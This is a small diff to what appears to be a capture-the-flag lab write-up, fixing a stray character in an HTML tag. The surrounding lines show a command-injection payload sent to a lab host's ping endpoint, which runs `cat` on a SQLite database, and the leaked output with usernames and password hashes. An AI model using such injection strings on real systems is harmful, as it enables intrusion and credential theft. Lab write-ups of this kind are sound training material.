@@ -179,7 +179,7 @@ ping: utech.db.sqlite: Name or service not known
 	- http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite`
  <p><span style="color:green"><em>
 ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
- </em><</span></p>   
+ </em></span></p>   
 
 From this we can see that the username and password hash.
 
